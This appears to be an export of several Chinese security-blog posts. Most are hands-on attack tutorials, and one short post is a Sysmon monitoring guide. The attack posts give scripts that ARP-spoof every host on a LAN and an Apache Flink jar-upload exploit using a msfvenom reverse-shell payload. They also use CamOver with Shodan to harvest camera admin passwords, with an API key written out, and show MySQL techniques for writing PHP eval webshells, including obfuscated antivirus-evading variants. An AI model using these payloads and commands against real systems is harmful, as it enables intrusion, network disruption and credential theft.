<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://www.rpmfind.net/linux/epel/7/x86_64/Packages/l/libnids-1.24-6.el7.x86_64.rpm</span><br><span class="line">wget https://cbs.centos.org/kojifiles/packages/dsniff/2.4/0.17.b1.el7/x86_64/dsniff-2.4-0.17.b1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh libnids-1.24-6.el7.x86_64.rpm</span><br><span class="line">rpm -ivh dsniff-2.4-0.17.b1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>

<h3 id="GitHub上的arpspoof安装"><a href="#GitHub上的arpspoof安装" class="headerlink" title="GitHub上的arpspoof安装"></a>GitHub上的arpspoof安装</h3><p>下载：<a href="https://github.com/byt3bl33d3r/arpspoof">https://github.com/byt3bl33d3r/arpspoof</a></p>
<p>进入文件执行安装命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<p>报错解决：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">缺少scapy</span><br><span class="line"></span><br><span class="line">安装pip，wget https://bootstrap.pypa.io/对应的pip版本号</span><br><span class="line"></span><br><span class="line">执行：pip install scapy</span><br><span class="line"></span><br><span class="line">再次安装：</span><br><span class="line"></span><br><span class="line">执行：python setup.py install</span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>1.对单一IP进行攻击测试;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arpspoof -i ens33 -t 192.168.100.10 192.168.100.1</span><br><span class="line">-i	物理网卡名称</span><br><span class="line">-t	目标IP地址</span><br><span class="line">	最后跟目标主机的网关IP地址</span><br></pre></td></tr></table></figure>

<p>2.对局域网全部机器进行攻击;</p>
<ul>
<li>编写一个脚本，获取局域网所有在线IP</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#此内容编辑保存成sh文件;并赋予执行权限(chmod 777 xx)</span><br><span class="line">#!/bin/bash</span><br><span class="line">#获取IP&amp;#xff0c;并将在线的IP写入up.txt的文件中</span><br><span class="line">&gt; /root/up.txt</span><br><span class="line">for i in `seq 255`;</span><br><span class="line">do      &#123;</span><br><span class="line">        M_ip=192.168.100.$i</span><br><span class="line">        ping -c1 -W1 $M_ip &amp;&gt;/dev/null</span><br><span class="line">        if [ $? -eq 0 ]</span><br><span class="line">        then</span><br><span class="line">                echo &quot;$M_ip&quot; &gt;&gt; /root/up.txt</span><br><span class="line">        fi</span><br><span class="line">        &#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br><span class="line">echo &quot;获取完成&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行第一个脚本后，运行第二个脚本实施攻击测试</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注意-i后边的网卡名字以及结尾的网关IP不要写错</span><br><span class="line">#!/bin/bash</span><br><span class="line">#进行arp群体攻击,目标来自于文件,如果想让自己上网,就把自己的IP从文件中去掉</span><br><span class="line">while read list</span><br><span class="line">do</span><br><span class="line">    &#123;</span><br><span class="line">arpspoof -i ens33 -t $list 192.168.100.1</span><br><span class="line">&#125;&amp;</span><br><span class="line">done &lt; /root/up.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>赋予脚本执行权限，运行脚本</li>
<li>注意脚本文件里的变量，需根据自身网络环境进行修改</li>
</ul>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
  </entry>
  <entry>
    <title>Apache Flink任意Jar包上传RCE</title>
    <url>/2021/10/29/Apache%20Flink%E4%BB%BB%E6%84%8FJar%E5%8C%85%E4%B8%8A%E4%BC%A0RCE/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。</p>
<p>有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞。攻击者只需要自己定制一个恶意jar上传，即可达到攻击目的。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>Apache Flink &lt;= 1.9.1(最新版本)</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOFA 语句</span><br><span class="line">app=&quot;Apache-Flink&quot; &amp;&amp; country=&quot;CN&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809093851114.png" alt="image-20210809093851114"></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>镜像下载地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</span><br></pre></td></tr></table></figure>

<p>下载好后进入bin文件夹。执行chmod +x *，再执行./start-cluster.sh</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094032637.png" alt="image-20210809094032637"></p>
<p>访问<a href="http://ip:8081可看到环境页面：">http://ip:8081可看到环境页面：</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094302926.png" alt="image-20210809094302926"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.在kali中使用msfvenom生成jar包；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp LHOST=192.168.40.132 LPORT=4444 -f jar &gt;msfshell.jar</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094432691.png" alt="image-20210809094432691"></p>
<p>2.在kali中使用nc监听6666端口；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094515194.png" alt="image-20210809094515194"></p>
<p>3.上传生成的jar包</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094615504.png" alt="image-20210809094615504"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094644864.png" alt="image-20210809094644864"></p>
<p>点击Submit后，成功反弹shell；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094735187.png" alt="image-20210809094735187"></p>
<p>获取到的shell非正常交互界面，可执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094810139.png" alt="image-20210809094810139"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>Sysmon安装与使用</title>
    <url>/2021/10/29/Sysmon%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>编写“Threat Hunt系列”的指导文章主要原因是，安全研究人员在编写渗透测试文章后并没有提供检测技术。渗透测试人员虽然完成了很多出色的工作、描述了对手所使用的工具和技术，但是只有少数人愿意共享出用于检测他们所使用的工具或者编写的代码。</p>
<p>系统监视器（Sysmon）是Windows系统服务和设备驱动程序。应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。</p>
<hr>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载sysmon;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</span><br></pre></td></tr></table></figure>

<p>在sysmon目录下新启cmd并执行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysmon64.exe -i </span><br></pre></td></tr></table></figure>

<p><img src="D:\long\BOOK\主机安全研究\sysmon使用\sysmon安装与使用.assets\image-20210820095543545.png" alt="image-20210820095543545"></p>
<p>​    打开sysmon事件查看：「事件查看器」——「应用程序和服务日志」——「Microsoft」——「Windows」——「Sysmon」文件夹，其中记录了 Sysmon 写入到 Event Log 中的所有事件</p>
<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysmon -u</span><br></pre></td></tr></table></figure>

<h2 id="过滤器标签"><a href="#过滤器标签" class="headerlink" title="过滤器标签"></a>过滤器标签</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ProcessCreate            进程创建</span><br><span class="line">FileCreateTime           文件创建时间更改</span><br><span class="line">NetworkConnect           检测到网络连接</span><br><span class="line">ProcessTerminate         进程终止</span><br><span class="line">DriverLoad               驱动程序已加载</span><br><span class="line">ImageLoad                镜像加载</span><br><span class="line">CreateRemoteThread       已检测到创建远程线程</span><br><span class="line">RawAccessRead            检测到原始访问读取</span><br><span class="line">ProcessAccess            已访问的进程</span><br><span class="line">FileCreate               文件创建</span><br><span class="line">RegistryEvent            添加或删除注册表对象</span><br><span class="line">RegistryEvent            注册表值设置</span><br><span class="line">RegistryEvent            注册表对象已重命名</span><br><span class="line">FileCreateStreamHash     已创建文件流</span><br><span class="line">PipeEvent                管道创建</span><br><span class="line">PipeEvent                管道已连接</span><br><span class="line">WmiEvent                 检测到WmiEventFilter活动 -- WmiEventFilter activity detected</span><br><span class="line">WmiEvent                 检测到WmiEventConsumer活动 -- WmiEventConsumer activity detected</span><br><span class="line">WmiEvent                 检测到WmiEventConsumerToFilter活动 -- WmiEventConsumerToFilter activity </span><br><span class="line">DnsQuery                 DNS查询</span><br></pre></td></tr></table></figure>

<h2 id="事件ID"><a href="#事件ID" class="headerlink" title="事件ID"></a>事件ID</h2><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/A73038E4-A59D-47bf-9099-4787C7AF18B4.png" alt="A73038E4-A59D-47bf-9099-4787C7AF18B4"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/2.png" alt="2"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/34.png" alt="34"></p>
]]></content>
      <categories>
        <category>Threat Hunt</category>
      </categories>
  </entry>
  <entry>
    <title>CamOver安装与使用</title>
    <url>/2021/10/30/CamOver%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全研究为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>CamOver 是一款功能强大的摄像头漏洞利用工具，在该工具的帮助下，广大研究人员可以轻松破解网络摄像头的管理员密码，并且能与<a href="https://www.shodan.io/">shodan</a>网络设备搜索引擎配合利用。</p>
<ul>
<li>项目地址：<a href="https://github.com/EntySec/CamOver">https://github.com/EntySec/CamOver</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux安装CamOver"><a href="#Linux安装CamOver" class="headerlink" title="Linux安装CamOver"></a>Linux安装CamOver</h3><p>由于 CamOver 使用 Python3 开发，因此首先需要在本地设备上安装并配置好 Python3 环境。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install git+https://github.com/EntySec/CamOver</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211029193739833.png" alt="image-20211029193739833"></p>
<h3 id="功能特性"><a href="#功能特性" class="headerlink" title="功能特性"></a>功能特性</h3><ul>
<li>该工具能够发现并利用大多数主流型号网络摄像头中的安全漏洞，例如 CCTV、GoAhead 和 Netwave 等。</li>
<li>经过优化，支持多线程同时攻击多个摄像头。</li>
<li>简单的命令行接口和 API 用法。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># camover</span></span><br><span class="line">usage: camover [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN] [--zoomeye ZOOMEYE] [-p PAGES]</span><br><span class="line"></span><br><span class="line">CamOver is a camera exploitation tool that allows to disclosure network camera admin password.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -t, --threads         Use threads <span class="keyword">for</span> fastest work.</span><br><span class="line">  -o OUTPUT, --output OUTPUT</span><br><span class="line">                        Output result to file.</span><br><span class="line">  -i INPUT, --input INPUT</span><br><span class="line">                        Input file of addresses.</span><br><span class="line">  -a ADDRESS, --address ADDRESS</span><br><span class="line">                        Single address.</span><br><span class="line">  --shodan SHODAN       Shodan API key <span class="keyword">for</span> exploiting devices over Internet.</span><br><span class="line">  --zoomeye ZOOMEYE     ZoomEye API key <span class="keyword">for</span> exploiting devices over Internet.</span><br><span class="line">  -p PAGES, --pages PAGES</span><br><span class="line">                        Number of pages you want to get from ZoomEye.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Shodan的基本使用"><a href="#Shodan的基本使用" class="headerlink" title="Shodan的基本使用"></a>Shodan的基本使用</h3><p>官网：<a href="https://www.shodan.io/">shodan</a>，Shodan一些常用的语法；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname：搜索指定的主机或域名。例如，hostname:&quot;google&quot;</span><br><span class="line"></span><br><span class="line">port：搜索指定的端口或服务。例如， port:&quot;21&quot;</span><br><span class="line"></span><br><span class="line">country：搜索指定的国家。例如， country:&quot;CN&quot;</span><br><span class="line"></span><br><span class="line">city：搜索指定的城市。例如，city:&quot;Hefei&quot;</span><br><span class="line"></span><br><span class="line">org：搜索指定的组织或公司。例如，org:&quot;google&quot;</span><br><span class="line"></span><br><span class="line">isp：搜索指定的ISP供应商。例如， isp:&quot;China Telecom&quot;</span><br><span class="line"></span><br><span class="line">product：搜索指定的操作系统/软件/平台。例如， product:&quot;Apache httpd&quot;</span><br><span class="line"></span><br><span class="line">version：搜索指定的软件版本。例如， version:&quot;1.6.2&quot;</span><br><span class="line"></span><br><span class="line">geo：搜索指定的地理位置，参数为经纬度。例如， geo:&quot;31.8639,117.2808&quot;</span><br><span class="line"></span><br><span class="line">before/after：搜索指定收录时间前后的数据，格式为 dd-mm-yy。例如， before:&quot;11-09-19&quot;</span><br><span class="line"></span><br><span class="line">net：搜索指定的IP地址或子网。例如，net:&quot;210.45.240.0/24&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Shodan搜索例子"><a href="#Shodan搜索例子" class="headerlink" title="Shodan搜索例子"></a>Shodan搜索例子</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、查找位于合肥的Apache服务器</span><br><span class="line">apache city:&quot;Hefei&quot;</span><br><span class="line"></span><br><span class="line">2、查找位于国内的Nginx服务器</span><br><span class="line">nginx country:&quot;CN&quot;</span><br><span class="line"> </span><br><span class="line">3、查找GWS（Gogle Web Server）服务器</span><br><span class="line">server: gws hostname:&quot;google&quot;</span><br><span class="line"></span><br><span class="line">4、查找指定网段华为设备</span><br><span class="line">huawei net:&quot;64.191.146.0/24&quot;</span><br><span class="line"></span><br><span class="line">5、查找网络摄像头</span><br><span class="line">webcam</span><br><span class="line"></span><br><span class="line">6、查找国内的海康威视网络摄像头</span><br><span class="line">Server: Hikvision-Webs country:&quot;CN&quot;</span><br><span class="line"></span><br><span class="line">7、查找SQ-WEBCAM摄像头</span><br><span class="line">Server: SQ-WEBCAM</span><br></pre></td></tr></table></figure>



<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><strong>1.攻击单个摄像头;</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">camover -a xxx.xxx.xxx.xxx:port</span><br></pre></td></tr></table></figure>

<p><strong>2.通过网络攻击远程摄像头;</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">camover -t --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211029200703875.png" alt="image-20211029200703875"></p>
<p>使用浏览器访问；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211029200745747.png" alt="image-20211029200745747"></p>
<p><strong>3.从输入文件获取目标摄像头；</strong></p>
<p>还可以使用开放数据库中提供的摄像头地址，使用 <code>-t</code> 参数来设置多线程数量以获得更好的性能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">camover -t -i cameras.txt -o passwords.txt</span><br></pre></td></tr></table></figure>

<p>此命令将会攻击 cameras.txt 中给出的所有摄像头，并会将所有获取到的密码存储至 passwords.txt 文件中。</p>
<p><strong>4.API的调用</strong></p>
<p>CamOver 还提供了自己的 <strong>Python API</strong>，可以将其导入至你们自己的项目代码中并调用其功能：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> camover <span class="keyword">import</span> CamOver</span><br></pre></td></tr></table></figure>

<p>调用样例，攻击单个摄像头：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> camover <span class="keyword">import</span> CamOver</span><br><span class="line"></span><br><span class="line">camover = CamOver()</span><br><span class="line">creds = camover.exploit(<span class="string">&#x27;xxx.xxx.xxx.xxx:port&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(creds)</span><br><span class="line"><span class="comment"># 输出: (&#x27;admin&#x27;, &#x27;gzmudzka&#x27;)</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL写shell的利用</title>
    <url>/2021/11/01/MySQL%E5%86%99shell%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>关于MySQL写shell的方法网上基本很多了，我也在此总结下。众所周知，web渗透的成功很多是需要前置条件的，比如中间件的配置不当、账户权限的混淆等等，这些看起来或许只是为增强用户体验感而设计的功能，在安全研究人员的面前就变味了……</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>全版本？</p>
<hr>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
<li>Windows 7</li>
<li>点击下载<a href="https://www.xp.cn/download.html">phpStudy</a>，安装并启动；</li>
</ol>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101110402178.png" alt="image-20211101110402178"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="MySQL权限的获取"><a href="#MySQL权限的获取" class="headerlink" title="MySQL权限的获取"></a>MySQL权限的获取</h3><p>拿到 MySQL 的用户名和密码的方式多种多样：</p>
<ol>
<li>MySQL 3306 端口弱口令爆破</li>
<li>sqlmap 注入的 <code>--sql-shell</code> 模式</li>
<li>网站的数据库配置文件中拿到明文密码信息</li>
<li>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</li>
</ol>
<h3 id="MySQL-shell的写入条件"><a href="#MySQL-shell的写入条件" class="headerlink" title="MySQL shell的写入条件"></a>MySQL shell的写入条件</h3><ol>
<li>数据库当前用户为root权限；</li>
<li>知道当前网站的绝对路径；</li>
<li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li>
<li>写入shell的路径存在写入权限；</li>
<li><code>secure_file_priv</code> 无限制。</li>
</ol>
<h3 id="outfile和dumpfile写shell"><a href="#outfile和dumpfile写shell" class="headerlink" title="outfile和dumpfile写shell"></a>outfile和dumpfile写shell</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><strong><code>outfile</code>和<code>dumpfile</code>的区别：</strong></p>
<p><code>outfile</code>:</p>
<ol>
<li>支持多行数据同时导出；</li>
<li>使用union联合查询时，要保证两侧查询的列数相同；</li>
<li>会在换行符制表符后面追加反斜杠；</li>
<li>会在末尾追加换行。</li>
</ol>
<p><code>dumpfile</code>:</p>
<ol>
<li>每次只能导出一行数据；</li>
<li>不会在换行符制表符后面追加反斜杠；</li>
<li>不会在末尾追加换行。</li>
</ol>
<p><strong>基于UNION联合查询</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 UNION ALL SELECT 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;%23</span><br><span class="line">?id=1 UNION ALL SELECT 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into dumpfile &#x27;C:\info.php&#x27;%23</span><br></pre></td></tr></table></figure>

<p><strong>非联合查询</strong></p>
<p>当无法使用<code>UNION联合查询</code>时，可以使用<code>fields terminated by</code>与<code>lines terminated by</code>来写shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 into outfile &#x27;C:\info.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php phpinfo();?&gt;&#x27;%23</span><br></pre></td></tr></table></figure>

<p><strong>代替空格的方法</strong></p>
<p><code>+</code>号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、<code>/**/</code>注释符等</p>
<h4 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a><code>into oufile</code> 写 shell</h4><p>查询MySQL是否没有 secure_file_priv 限制；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">Value</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NULL</td>
<td align="left">不允许导入或导出</td>
</tr>
<tr>
<td align="left">/tmp</td>
<td align="left">只允许在 /tmp 目录导入导出</td>
</tr>
<tr>
<td align="left">空</td>
<td align="left">不限制目录</td>
</tr>
</tbody></table>
<blockquote>
<p>说明：</p>
<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件。</p>
<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件。</p>
</blockquote>
<h5 id="原生一句话shell"><a href="#原生一句话shell" class="headerlink" title="原生一句话shell"></a>原生一句话shell</h5><p>满足上<code>secure_file_priv</code>为空的条件，那么可以尝试使用下面原生的 SQL 语句来直接写 一句话木马（直接在MySQL中执行）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span><br></pre></td></tr></table></figure>

<h5 id="sqlmap写入shell"><a href="#sqlmap写入shell" class="headerlink" title="sqlmap写入shell"></a>sqlmap写入shell</h5><p>sqlmap 中可以如下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --file-write=&#x27;shellpass.php&#x27; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span><br></pre></td></tr></table></figure>

<h4 id="into-dumpfile写shell"><a href="#into-dumpfile写shell" class="headerlink" title="into dumpfile写shell"></a><code>into dumpfile</code>写shell</h4><p>突破<code>secure-file-priv</code>写shell;</p>
<blockquote>
<p>日志文件写shell，前提：</p>
<ul>
<li>Web 文件夹宽松权限可以写入</li>
<li>Windows 系统下</li>
<li>高权限运行 MySQL 或者 Apache</li>
</ul>
</blockquote>
<p>说到底，就是修改MySQL的日志变量路径为shell.php。一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
<h5 id="普通型shell"><a href="#普通型shell" class="headerlink" title="普通型shell"></a>普通型shell</h5><p>在MySQL命令行中依次执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;	--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="line">set global general_log = on;		--开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="line">set global general_log_file = &#x27;C:\\phpStudy\\WWW\\shell\\shell.php&#x27;;		--设置日志路径</span><br><span class="line"># 若出现以下报错信息说明此MySQL用户没用写入目录文件的权限：</span><br><span class="line">ERROR 1231 (42000): Variable &#x27;general_log_file&#x27; can&#x27;t be set to the value of &#x27;C:</span><br><span class="line">\phpStudy\WWW\shell\shell.php&#x27;</span><br><span class="line">* 解决：手工在C:\phpStudy\WWW\shell\目录下新建shell.php文件</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;;		--执行查询，写入shell</span><br></pre></td></tr></table></figure>

<p>具体操作如下演示；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%general%&#x27;;</span><br><span class="line">+------------------+------------------------------------+</span><br><span class="line">| Variable_name    | Value                              |</span><br><span class="line">+------------------+------------------------------------+</span><br><span class="line">| general_log      | ON                                 |</span><br><span class="line">| general_log_file | C:\phpStudy\MySQL\data\long-PC.log |</span><br><span class="line">+------------------+------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set global general_log = on;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set global general_log_file = &#x27;C:\\phpStudy\\WWW\\shell\\shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | ON                              |</span><br><span class="line">| general_log_file | C:\phpStudy\WWW\shell\shell.php |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| &lt;?php @eval($_POST[pass])?&gt; |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| &lt;?php @eval($_POST[pass])?&gt; |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="免杀型shell"><a href="#免杀型shell" class="headerlink" title="免杀型shell"></a>免杀型shell</h5><p>利用改变MySQL日志变量环境写shell，还可以写入具有一定免杀性的shell；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php $sl = create_function(&#x27;&#x27;, @$_REQUEST[&#x27;klion&#x27;]);$sl();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line">SELECT &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;username&#x27;]));?&gt;&quot;;</span><br></pre></td></tr></table></figure>

<h5 id="隐蔽型shell"><a href="#隐蔽型shell" class="headerlink" title="隐蔽型shell"></a>隐蔽型shell</h5><p>利用改变MySQL日志变量环境写shell，还可以利用MySQL的特性<code>慢查询</code>来写shell；</p>
